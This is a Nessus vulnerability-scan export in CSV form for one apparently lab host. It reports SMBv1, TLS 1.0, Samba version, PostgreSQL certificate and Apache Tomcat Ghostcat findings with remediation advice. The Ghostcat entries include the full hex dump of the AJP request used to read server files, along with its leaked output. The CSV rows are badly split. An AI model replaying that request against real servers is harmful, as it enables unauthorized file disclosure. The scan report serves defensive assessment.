Plugin ID;CVE;CVSS;Risk;Host;Protocol;Port;Name;Synopsis;Description;Solution;See Also;Plugin Output;STIG Severity;CVSS v3.0 Base Score;CVSS Temporal Score;CVSS v3.0 Temporal Score;Risk Factor;BID;XREF;MSKB;Plugin Publication Date;Plugin Modification Date;Metasploit;Core Impact;CANVAS
"these potential issues.""";Disable SMBv1 according to the vendor instructions in Microsoft;;;;;;;;;;;;;;;;;;;;;;;;
KB2696547. Additionally; block SMB directly by blocking TCP port 445;;;;;;;;;;;;;;;;;;;;;;;;
on all network boundary devices. For SMB over the NetBIOS API; block;;;;;;;;;;;;;;;;;;;;;;;;
TCP ports 137 / 139 and UDP ports 137 / 138 on all network boundary;;;;;;;;;;;;;;;;;;;;;;;;;
"devices.""";https://blogs.technet.microsoft.com/filecab/2016/09/16/stop-using-smb1/;;;;;;;;;;;;;;;;;;;;;;;;
https://support.microsoft.com/en-us/help/2696547/how-to-detect-enable-and-disable-smbv1-smbv2-and-smbv3-in-windows-and;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?8dcab5e4;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?234f8ef8;;;;;;;;;;;;;;;;;;;;;;;;;
"http://www.nessus.org/u?4c7e0cf3""";;;;;;;;;;;;;;;;;;;;;;;;;
The remote host supports SMBv1.;;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;03/02/2017;15/11/2018;;;;;;;;;;;;;;;;;
100871;;;None;10.0.2.6;tcp;445;Microsoft Windows SMB Versions Supported (remote check);It was possible to obtain information about the version of SMB running;;;;;;;;;;;;;;;;;
"on the remote host.""";Nessus was able to obtain the version of SMB running on the remote;;;;;;;;;;;;;;;;;;;;;;;;
host by sending an authentication request to port 139 or 445.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
"Note that this plugin is a remote check and does not work on agents.""";n/a;;;;;;;;;;;;;;;;;;;;;;;;
The remote host supports the following versions of SMB :;;;;;;;;;;;;;;;;;;;;;;;;;
  SMBv1;;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;19/06/2017;22/11/2019;;;;;;;;;;;;;;;;;
104743;;6.1;Medium;10.0.2.6;tcp;25;TLS Version 1.0 Protocol Detection;The remote service encrypts traffic using an older version of TLS.;The remote service accepts connections encrypted using TLS 1.0. TLS 1.0 has a;;;;;;;;;;;;;;;;
number of cryptographic design flaws. Modern implementations of TLS 1.0;;;;;;;;;;;;;;;;;;;;;;;;;
mitigate these problems; but newer versions of TLS like 1.2 and 1.3 are;;;;;;;;;;;;;;;;;;;;;;;;
designed against these flaws and should be used whenever possible.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
As of March 31;2020; Endpoints that arenâ€™t enabled for TLS 1.2;;;;;;;;;;;;;;;;;;;;;;;
and higher will no longer function properly with major web browsers and major vendors.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
PCI DSS v3.2 requires that TLS 1.0 be disabled entirely by June 30;;;;;;;;;;;;;;;;;;;;;;;;;
2018; except for POS POI terminals (and the SSL/TLS termination;;;;;;;;;;;;;;;;;;;;;;;;
points to which they connect) that can be verified as not being;;;;;;;;;;;;;;;;;;;;;;;;;
"susceptible to any known exploits.""";Enable support for TLS 1.2 and 1.3, and disable support for TLS 1.0.;https://tools.ietf.org/html/draft-ietf-tls-oldversions-deprecate-00;TLSv1 is enabled and the server supports at least one cipher.;;6.5;;;Medium;;;;22/11/2017;31/03/2020;;;;;;;;;;;;
104743;;6.1;Medium;10.0.2.6;tcp;5432;TLS Version 1.0 Protocol Detection;The remote service encrypts traffic using an older version of TLS.;The remote service accepts connections encrypted using TLS 1.0. TLS 1.0 has a;;;;;;;;;;;;;;;;
number of cryptographic design flaws. Modern implementations of TLS 1.0;;;;;;;;;;;;;;;;;;;;;;;;;
mitigate these problems; but newer versions of TLS like 1.2 and 1.3 are;;;;;;;;;;;;;;;;;;;;;;;;
designed against these flaws and should be used whenever possible.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
As of March 31;2020; Endpoints that arenâ€™t enabled for TLS 1.2;;;;;;;;;;;;;;;;;;;;;;;
and higher will no longer function properly with major web browsers and major vendors.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
PCI DSS v3.2 requires that TLS 1.0 be disabled entirely by June 30;;;;;;;;;;;;;;;;;;;;;;;;;
2018; except for POS POI terminals (and the SSL/TLS termination;;;;;;;;;;;;;;;;;;;;;;;;
points to which they connect) that can be verified as not being;;;;;;;;;;;;;;;;;;;;;;;;;
"susceptible to any known exploits.""";Enable support for TLS 1.2 and 1.3, and disable support for TLS 1.0.;https://tools.ietf.org/html/draft-ietf-tls-oldversions-deprecate-00;TLSv1 is enabled and the server supports at least one cipher.;;6.5;;;Medium;;;;22/11/2017;31/03/2020;;;;;;;;;;;;
104887;;;None;10.0.2.6;tcp;445;Samba Version;It was possible to obtain the samba version from the remote ;;;;;;;;;;;;;;;;;
"operating system.""";Nessus was able to obtain the samba version from the remote ;;;;;;;;;;;;;;;;;;;;;;;;
operating by sending an authentication request to port 139 or 445. ;;;;;;;;;;;;;;;;;;;;;;;;;
"Note that this plugin requires SMB1 to be enabled on the host.""";n/a;;;;;;;;;;;;;;;;;;;;;;;;
"The remote Samba Version is : Samba 3.0.20-Debian""";;;;;None;;;;30/11/2017;22/11/2019;;;;;;;;;;;;;;;
106716;;;None;10.0.2.6;tcp;445;Microsoft Windows SMB2 and SMB3 Dialects Supported (remote check);It was possible to obtain information about the dialects of SMB2 and SMB3 available;;;;;;;;;;;;;;;;;
"on the remote host.""";Nessus was able to obtain the set of SMB2 and SMB3 dialects running on the remote;;;;;;;;;;;;;;;;;;;;;;;;
"host by sending an authentication request to port 139 or 445.""";n/a;;;;;;;;;;;;;;;;;;;;;;;;
The remote host does NOT support the following SMB dialects :;;;;;;;;;;;;;;;;;;;;;;;;;
"	_version_  _introduced in windows version_";;;;;;;;;;;;;;;;;;;;;;;;;
"	2.0.2      Windows 2008  ";;;;;;;;;;;;;;;;;;;;;;;;;
"	2.1        Windows 7     ";;;;;;;;;;;;;;;;;;;;;;;;;
"	2.2.2      Windows 8 Beta";;;;;;;;;;;;;;;;;;;;;;;;;
"	2.2.4      Windows 8 Beta";;;;;;;;;;;;;;;;;;;;;;;;;
"	3.0        Windows 8     ";;;;;;;;;;;;;;;;;;;;;;;;;
"	3.0.2      Windows 8.1   ";;;;;;;;;;;;;;;;;;;;;;;;;
"	3.1        Windows 10    ";;;;;;;;;;;;;;;;;;;;;;;;;
"	3.1.1      Windows 10    ";;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;09/02/2018;11/03/2020;;;;;;;;;;;;;;;;;
110723;;;None;10.0.2.6;tcp;0;No Credentials Provided;Nessus was able to find common ports used for local checks,;;;;;;;;;;;;;;;;;
however;" no credentials were provided in the scan policy.""";Nessus was unable to execute credentialed checks because no ;;;;;;;;;;;;;;;;;;;;;;;
"credentials were provided.""";n/a;;SSH was detected on port 22 but no credentials were provided.;;;;;;;;;;;;;;;;;;;;;;
SSH local checks were not enabled.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;27/06/2018;02/10/2018;;;;;;;;;;;;;;;;;
117886;;;None;10.0.2.6;tcp;0;Local Checks Not Enabled (info);Local checks were not enabled.;Nessus did not enable local checks on the remote host. This does not;;;;;;;;;;;;;;;;
necessarily indicate a problem with the scan. Credentials may not have;;;;;;;;;;;;;;;;;;;;;;;;;
been provided; local checks may not be available for the target; the;;;;;;;;;;;;;;;;;;;;;;;
target may not have been identified; or another issue may have;;;;;;;;;;;;;;;;;;;;;;;;
occurred that prevented local checks from being enabled. See plugin;;;;;;;;;;;;;;;;;;;;;;;;;
output for details.;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
This plugin reports informational findings related to local checks not;;;;;;;;;;;;;;;;;;;;;;;;;
being enabled. For failure information; see plugin 21745 :;;;;;;;;;;;;;;;;;;;;;;;;
"'Authentication Failure - Local Checks Not Run'.""";n/a;;;;;;;;;;;;;;;;;;;;;;;;
The following issues were reported :;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
  - Plugin      : no_local_checks_credentials.nasl;;;;;;;;;;;;;;;;;;;;;;;;;
    Plugin ID   : 110723;;;;;;;;;;;;;;;;;;;;;;;;;
    Plugin Name : No Credentials Provided;;;;;;;;;;;;;;;;;;;;;;;;;
    Message     : ;;;;;;;;;;;;;;;;;;;;;;;;;
Credentials were not provided for detected SSH service.;;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;02/10/2018;02/11/2018;;;;;;;;;;;;;;;;;
118224;;;None;10.0.2.6;tcp;5432;PostgreSQL STARTTLS Support;The remote service supports encrypting traffic.;The remote PostgreSQL server supports the use of encryption;;;;;;;;;;;;;;;;
initiated during pre-login to switch from a cleartext to an;;;;;;;;;;;;;;;;;;;;;;;;;
"encrypted communications channel.""";n/a;https://www.postgresql.org/docs/9.2/protocol-flow.html#AEN96066;;;;;;;;;;;;;;;;;;;;;;;
"https://www.postgresql.org/docs/9.2/protocol-message-formats.html""";;;;;;;;;;;;;;;;;;;;;;;;;
Here is the PostgreSQL's SSL certificate that Nessus;;;;;;;;;;;;;;;;;;;;;;;;;
was able to collect after sending a pre-login packet :;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
Subject Name: ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Country: XX;;;;;;;;;;;;;;;;;;;;;;;;;
State/Province: There is no such thing outside US;;;;;;;;;;;;;;;;;;;;;;;;;
Locality: Everywhere;;;;;;;;;;;;;;;;;;;;;;;;;
Organization: OCOSA;;;;;;;;;;;;;;;;;;;;;;;;;
Organization Unit: Office for Complication of Otherwise Simple Affairs;;;;;;;;;;;;;;;;;;;;;;;;;
Common Name: ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
Email Address: root@ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Issuer Name: ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Country: XX;;;;;;;;;;;;;;;;;;;;;;;;;
State/Province: There is no such thing outside US;;;;;;;;;;;;;;;;;;;;;;;;;
Locality: Everywhere;;;;;;;;;;;;;;;;;;;;;;;;;
Organization: OCOSA;;;;;;;;;;;;;;;;;;;;;;;;;
Organization Unit: Office for Complication of Otherwise Simple Affairs;;;;;;;;;;;;;;;;;;;;;;;;;
Common Name: ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
Email Address: root@ubuntu804-base.localdomain;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Serial Number: 00 FA F9 3A 4C 7F B6 B9 CC ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Version: 1;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Signature Algorithm: SHA-1 With RSA Encryption;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Not Valid Before: Mar 17 14:07:45 2010 GMT;;;;;;;;;;;;;;;;;;;;;;;;;
Not Valid After: Apr 16 14:07:45 2010 GMT;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Public Key Info: ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Algorithm: RSA Encryption;;;;;;;;;;;;;;;;;;;;;;;;;
Key Length: 1024 bits;;;;;;;;;;;;;;;;;;;;;;;;;
Public Key: 00 D6 B4 13 36 33 9A 95 71 7B 1B DE 7C 83 75 DA 71 B1 3C A9 ;;;;;;;;;;;;;;;;;;;;;;;;;
            7F FE AD 64 1B 77 E9 4F AE BE CA D4 F8 CB EF AE BB 43 79 24 ;;;;;;;;;;;;;;;;;;;;;;;;;
            73 FF 3C E5 9E 3B 6D FC C8 B1 AC FA 4C 4D 5E 9B 4C 99 54 0B ;;;;;;;;;;;;;;;;;;;;;;;;;
            D7 A8 4A 50 BA A9 DE 1D 1F F4 E4 6B 02 A3 F4 6B 45 CD 4C AF ;;;;;;;;;;;;;;;;;;;;;;;;;
            8D 89 62 33 8F 65 BB 36 61 9F C4 2C 73 C1 4E 2E A0 A8 14 4E ;;;;;;;;;;;;;;;;;;;;;;;;;
            98 70 46 61 BB D1 B9 31 DF 8C 99 EE 75 6B 79 3C 40 A0 AE 97 ;;;;;;;;;;;;;;;;;;;;;;;;;
            00 90 9D DC 99 0D 33 A4 B5 ;;;;;;;;;;;;;;;;;;;;;;;;;
Exponent: 01 00 01 ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
Signature Length: 128 bytes / 1024 bits;;;;;;;;;;;;;;;;;;;;;;;;;
Signature: 00 92 A4 B4 B8 14 55 63 25 51 4A 0B C3 2A 22 CF 3A F8 17 6A ;;;;;;;;;;;;;;;;;;;;;;;;;
           0C CF 66 AA A7 65 2F 48 6D CD E3 3E 5C 9F 77 6C D4 44 54 1F ;;;;;;;;;;;;;;;;;;;;;;;;;
           1E 84 4F 8E D4 8D DD AC 2D 88 09 21 A8 DA 56 2C A9 05 3C 49 ;;;;;;;;;;;;;;;;;;;;;;;;;
           68 35 19 75 0C DA 53 23 88 88 19 2D 74 26 C1 22 65 EE 11 68 ;;;;;;;;;;;;;;;;;;;;;;;;;
           83 6A 53 4A 9C 27 CB A0 B4 E9 8D 29 0C B2 3C 18 5C 67 CC 53 ;;;;;;;;;;;;;;;;;;;;;;;;;
           A6 1E 30 D0 AA 26 7B 1E AE 40 B9 29 01 6C 2E BC A2 19 94 7C ;;;;;;;;;;;;;;;;;;;;;;;;;
           15 6E 8D 30 38 F6 CA 2E 75 ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
;,;,;"None""";;;;19/10/2018;15/11/2018;;;;;;;;;;;;;;;;;
134862;CVE-2020-1745;7.5;High;10.0.2.6;tcp;8009;Apache Tomcat AJP Connector Request Injection (Ghostcat);There is a vulnerable AJP connector listening on the remote host.;A file read/inclusion vulnerability was found in AJP connector. A;;;;;;;;;;;;;;;;
 remote; unauthenticated attacker could exploit this vulnerability to ;;;;;;;;;;;;;;;;;;;;;;;;
read web application files from a vulnerable server. In instances where;;;;;;;;;;;;;;;;;;;;;;;;;
the vulnerable server allows file uploads; an attacker could upload ;;;;;;;;;;;;;;;;;;;;;;;;
malicious JavaServer Pages (JSP) code within a variety of file types ;;;;;;;;;;;;;;;;;;;;;;;;;
"and gain remote code execution (RCE).""";Update the AJP configuration to require authorization and/or upgrade the Tomcat server to 7.0.100, 8.5.51, 9.0.31 or later.;http://www.nessus.org/u?8ebe6246;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?4e287adb;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?cbc3d54e;;;;;;;;;;;;;;;;;;;;;;;;;
https://access.redhat.com/security/cve/CVE-2020-1745;;;;;;;;;;;;;;;;;;;;;;;;;
https://access.redhat.com/solutions/4851251;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?dd218234;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?dd772531;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?2a01d6bf;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?3b5af27e;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?9dab109f;;;;;;;;;;;;;;;;;;;;;;;;;
"http://www.nessus.org/u?5eafcf70""";;;;;;;;;;;;;;;;;;;;;;;;;
Nessus was able to exploit the issue using the following request :;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
0x0000:  02 02 00 08 48 54 54 50 2F 31 2E 31 00 00 0F 2F    ....HTTP/1.1.../;;;;;;;;;;;;;;;;;;;;;;;;;
0x0010:  61 73 64 66 2F 78 78 78 78 78 2E 6A 73 70 00 00    asdf/xxxxx.jsp..;;;;;;;;;;;;;;;;;;;;;;;;;
0x0020:  09 6C 6F 63 61 6C 68 6F 73 74 00 FF FF 00 09 6C    .localhost.....l;;;;;;;;;;;;;;;;;;;;;;;;;
0x0030:  6F 63 61 6C 68 6F 73 74 00 00 50 00 00 09 A0 06    ocalhost..P.....;;;;;;;;;;;;;;;;;;;;;;;;;
0x0040:  00 0A 6B 65 65 70 2D 61 6C 69 76 65 00 00 0F 41    ..keep-alive...A;;;;;;;;;;;;;;;;;;;;;;;;;
0x0050:  63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 00 00    ccept-Language..;;;;;;;;;;;;;;;;;;;;;;;;;
0x0060:  0E 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 35 00    .en-US;en;;;;;;;;;;;;;;;;;;;;;;;;
0x0070:  A0 08 00 01 30 00 00 0F 41 63 63 65 70 74 2D 45    ....0...Accept-E;;;;;;;;;;;;;;;;;;;;;;;;;
0x0080:  6E 63 6F 64 69 6E 67 00 00 13 67 7A 69 70 2C 20    ncoding...gzip; ;;;;;;;;;;;;;;;;;;;;;;;;
0x0090:  64 65 66 6C 61 74 65 2C 20 73 64 63 68 00 00 0D    deflate; sdch...;;;;;;;;;;;;;;;;;;;;;;;;
0x00A0:  43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 00 00 09    Cache-Control...;;;;;;;;;;;;;;;;;;;;;;;;;
0x00B0:  6D 61 78 2D 61 67 65 3D 30 00 A0 0E 00 07 4D 6F    max-age=0.....Mo;;;;;;;;;;;;;;;;;;;;;;;;;
0x00C0:  7A 69 6C 6C 61 00 00 19 55 70 67 72 61 64 65 2D    zilla...Upgrade-;;;;;;;;;;;;;;;;;;;;;;;;;
0x00D0:  49 6E 73 65 63 75 72 65 2D 52 65 71 75 65 73 74    Insecure-Request;;;;;;;;;;;;;;;;;;;;;;;;;
0x00E0:  73 00 00 01 31 00 A0 01 00 09 74 65 78 74 2F 68    s...1.....text/h;;;;;;;;;;;;;;;;;;;;;;;;;
0x00F0:  74 6D 6C 00 A0 0B 00 09 6C 6F 63 61 6C 68 6F 73    tml.....localhos;;;;;;;;;;;;;;;;;;;;;;;;;
0x0100:  74 00 0A 00 21 6A 61 76 61 78 2E 73 65 72 76 6C    t...!javax.servl;;;;;;;;;;;;;;;;;;;;;;;;;
0x0110:  65 74 2E 69 6E 63 6C 75 64 65 2E 72 65 71 75 65    et.include.reque;;;;;;;;;;;;;;;;;;;;;;;;;
0x0120:  73 74 5F 75 72 69 00 00 01 31 00 0A 00 1F 6A 61    st_uri...1....ja;;;;;;;;;;;;;;;;;;;;;;;;;
0x0130:  76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E 63 6C    vax.servlet.incl;;;;;;;;;;;;;;;;;;;;;;;;;
0x0140:  75 64 65 2E 70 61 74 68 5F 69 6E 66 6F 00 00 0C    ude.path_info...;;;;;;;;;;;;;;;;;;;;;;;;;
"0x0150:  2F 6D 69 73 73 69 6E 67 2E 74 78 74 00 0A 00 22    /missing.txt...""""";;;;;;;;;;;;;;;;;;;;;;;;;
0x0160:  6A 61 76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E    javax.servlet.in;;;;;;;;;;;;;;;;;;;;;;;;;
0x0170:  63 6C 75 64 65 2E 73 65 72 76 6C 65 74 5F 70 61    clude.servlet_pa;;;;;;;;;;;;;;;;;;;;;;;;;
0x0180:  74 68 00 00 00 00 FF                               th.....         ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
This produced the following truncated output (limited to 10 lines) :;;;;;;;;;;;;;;;;;;;;;;;;;
------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
"...<?xml version=""""1.0"""" encoding=""""ISO-8859-1""""?>";;;;;;;;;;;;;;;;;;;;;;;;;
<!--;;;;;;;;;;;;;;;;;;;;;;;;;
Licensed to the Apache Software Foundation (ASF) under one or more;;;;;;;;;;;;;;;;;;;;;;;;;
contributor license agreements.  See the NOTICE file distributed with;;;;;;;;;;;;;;;;;;;;;;;;;
this work for additional information regarding copyright ownership.;;;;;;;;;;;;;;;;;;;;;;;;;
The ASF licenses this file to You under the Apache License; Version 2.0;;;;;;;;;;;;;;;;;;;;;;;;
"(the """"License"""")";;;;;;;;;;;;;;;;;;;;;;;;;
the License.  You may obtain a copy of the License at;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.apache.org/licenses/LICENSE-2.0;;;;;;;;;;;;;;;;;;;;;;;;;
[...];;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
------------------------------ snip ------------------------------;;;;;;;;;;;;;;;;;;;;;;;;;
;,9.8;5.9;8.8;High;;;;24/03/2020;12/06/2020;;;;;;;;;;;;;;;;
134862;CVE-2020-1938;7.5;High;10.0.2.6;tcp;8009;Apache Tomcat AJP Connector Request Injection (Ghostcat);There is a vulnerable AJP connector listening on the remote host.;A file read/inclusion vulnerability was found in AJP connector. A;;;;;;;;;;;;;;;;
 remote; unauthenticated attacker could exploit this vulnerability to ;;;;;;;;;;;;;;;;;;;;;;;;
read web application files from a vulnerable server. In instances where;;;;;;;;;;;;;;;;;;;;;;;;;
the vulnerable server allows file uploads; an attacker could upload ;;;;;;;;;;;;;;;;;;;;;;;;
malicious JavaServer Pages (JSP) code within a variety of file types ;;;;;;;;;;;;;;;;;;;;;;;;;
"and gain remote code execution (RCE).""";Update the AJP configuration to require authorization and/or upgrade the Tomcat server to 7.0.100, 8.5.51, 9.0.31 or later.;http://www.nessus.org/u?8ebe6246;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?4e287adb;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?cbc3d54e;;;;;;;;;;;;;;;;;;;;;;;;;
https://access.redhat.com/security/cve/CVE-2020-1745;;;;;;;;;;;;;;;;;;;;;;;;;
https://access.redhat.com/solutions/4851251;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?dd218234;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?dd772531;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?2a01d6bf;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?3b5af27e;;;;;;;;;;;;;;;;;;;;;;;;;
http://www.nessus.org/u?9dab109f;;;;;;;;;;;;;;;;;;;;;;;;;
"http://www.nessus.org/u?5eafcf70""";;;;;;;;;;;;;;;;;;;;;;;;;
Nessus was able to exploit the issue using the following request :;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
0x0000:  02 02 00 08 48 54 54 50 2F 31 2E 31 00 00 0F 2F    ....HTTP/1.1.../;;;;;;;;;;;;;;;;;;;;;;;;;
0x0010:  61 73 64 66 2F 78 78 78 78 78 2E 6A 73 70 00 00    asdf/xxxxx.jsp..;;;;;;;;;;;;;;;;;;;;;;;;;
0x0020:  09 6C 6F 63 61 6C 68 6F 73 74 00 FF FF 00 09 6C    .localhost.....l;;;;;;;;;;;;;;;;;;;;;;;;;
0x0030:  6F 63 61 6C 68 6F 73 74 00 00 50 00 00 09 A0 06    ocalhost..P.....;;;;;;;;;;;;;;;;;;;;;;;;;
0x0040:  00 0A 6B 65 65 70 2D 61 6C 69 76 65 00 00 0F 41    ..keep-alive...A;;;;;;;;;;;;;;;;;;;;;;;;;
0x0050:  63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 00 00    ccept-Language..;;;;;;;;;;;;;;;;;;;;;;;;;
0x0060:  0E 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 35 00    .en-US;en;;;;;;;;;;;;;;;;;;;;;;;;
0x0070:  A0 08 00 01 30 00 00 0F 41 63 63 65 70 74 2D 45    ....0...Accept-E;;;;;;;;;;;;;;;;;;;;;;;;;
0x0080:  6E 63 6F 64 69 6E 67 00 00 13 67 7A 69 70 2C 20    ncoding...gzip; ;;;;;;;;;;;;;;;;;;;;;;;;
0x0090:  64 65 66 6C 61 74 65 2C 20 73 64 63 68 00 00 0D    deflate; sdch...;;;;;;;;;;;;;;;;;;;;;;;;
0x00A0:  43 61 63 68 65 2D 43 6F 6E 74 72 6F 6C 00 00 09    Cache-Control...;;;;;;;;;;;;;;;;;;;;;;;;;
0x00B0:  6D 61 78 2D 61 67 65 3D 30 00 A0 0E 00 07 4D 6F    max-age=0.....Mo;;;;;;;;;;;;;;;;;;;;;;;;;
0x00C0:  7A 69 6C 6C 61 00 00 19 55 70 67 72 61 64 65 2D    zilla...Upgrade-;;;;;;;;;;;;;;;;;;;;;;;;;
0x00D0:  49 6E 73 65 63 75 72 65 2D 52 65 71 75 65 73 74    Insecure-Request;;;;;;;;;;;;;;;;;;;;;;;;;
0x00E0:  73 00 00 01 31 00 A0 01 00 09 74 65 78 74 2F 68    s...1.....text/h;;;;;;;;;;;;;;;;;;;;;;;;;
0x00F0:  74 6D 6C 00 A0 0B 00 09 6C 6F 63 61 6C 68 6F 73    tml.....localhos;;;;;;;;;;;;;;;;;;;;;;;;;
0x0100:  74 00 0A 00 21 6A 61 76 61 78 2E 73 65 72 76 6C    t...!javax.servl;;;;;;;;;;;;;;;;;;;;;;;;;
0x0110:  65 74 2E 69 6E 63 6C 75 64 65 2E 72 65 71 75 65    et.include.reque;;;;;;;;;;;;;;;;;;;;;;;;;
0x0120:  73 74 5F 75 72 69 00 00 01 31 00 0A 00 1F 6A 61    st_uri...1....ja;;;;;;;;;;;;;;;;;;;;;;;;;
0x0130:  76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E 63 6C    vax.servlet.incl;;;;;;;;;;;;;;;;;;;;;;;;;
0x0140:  75 64 65 2E 70 61 74 68 5F 69 6E 66 6F 00 00 0C    ude.path_info...;;;;;;;;;;;;;;;;;;;;;;;;;
"0x0150:  2F 6D 69 73 73 69 6E 67 2E 74 78 74 00 0A 00 22    /missing.txt...""""";;;;;;;;;;;;;;;;;;;;;;;;;
0x0160:  6A 61 76 61 78 2E 73 65 72 76 6C 65 74 2E 69 6E    javax.servlet.in;;;;;;;;;;;;;;;;;;;;;;;;;
0x0170:  63 6C 75 64 65 2E 73 65 72 76 6C 65 74 5F 70 61    clude.servlet_pa;;;;;;;;;;;;;;;;;;;;;;;;;
0x0180:  74 68 00 00 00 00 FF                               th.....         ;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;
